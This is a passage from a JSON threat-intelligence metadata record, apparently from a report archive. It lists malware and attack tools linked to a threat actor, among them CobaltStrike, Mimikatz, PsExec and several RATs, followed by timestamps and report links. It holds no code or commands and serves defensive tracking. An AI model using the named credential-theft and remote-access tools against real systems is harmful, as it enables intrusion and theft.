                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041818,
    "ts_creation_date": 1495621895,
    "ts_modification_date": 1495621923,
    "files": {
        "pdf": "https://archive.orkl.eu/fd935612ea036144030f0ca7fce0810b09c6eec4.pdf",
        "text": "https://archive.orkl.eu/fd935612ea036144030f0ca7fce0810b09c6eec4.txt",
        "img": "https://archive.orkl.eu/fd935612ea036144030f0ca7fce0810b09c6eec4.jpg"
    }
}